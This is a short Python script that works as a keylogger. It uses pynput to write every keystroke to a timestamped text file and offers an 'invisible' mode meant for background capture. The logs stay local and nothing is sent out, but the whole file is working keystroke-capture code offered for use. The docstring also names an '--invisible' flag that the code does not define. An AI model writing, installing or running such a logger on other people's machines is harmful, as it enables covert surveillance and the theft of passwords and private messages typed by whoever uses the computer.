"""Simple keylogger: logs keystrokes to a .txt file. Use --mode visible or --invisible."""
import argparse
import os
import sys
from datetime import datetime

try:
    from pynput import keyboard
except ImportError:
    print("Install dependencies: pip install pynput", file=sys.stderr)
    sys.exit(1)


def get_log_path(log_dir):
    return os.path.join(log_dir, datetime.now().strftime("%d-%m-%Y_%H-%M") + ".txt")


def main():
    parser = argparse.ArgumentParser(description="Log keystrokes to a .txt file.")
    parser.add_argument(
        "--mode",
        choices=["visible", "invisible"],
        default="visible",
        help="visible = show console; invisible = run in background",
    )
    parser.add_argument("--output-dir", default=os.getcwd(), help="Directory for log file")
    args = parser.parse_args()
    log_dir = os.path.abspath(args.output_dir)
    os.makedirs(log_dir, exist_ok=True)
    log_file = get_log_path(log_dir)

    def on_press(key):
        try:
            with open(log_file, "a", encoding="utf-8") as f:
                if hasattr(key, "char") and key.char is not None:
                    f.write(key.char)
                else:
                    name = getattr(key, "name", str(key))
                    f.write("\n" if name == "enter" else f"[{name}]")
        except Exception as e:
            with open(log_file, "a", encoding="utf-8") as f:
                f.write(f"\n[Error: {e}]\n")

    if args.mode == "visible":
        print(f"Logging to: {log_file}\nPress Ctrl+C to stop.")
    try:
        with keyboard.Listener(on_press=on_press) as listener:
            listener.join()
    except KeyboardInterrupt:
        if args.mode == "visible":
            print(f"Stopped. Log saved to {log_file}")


if __name__ == "__main__":
    main()
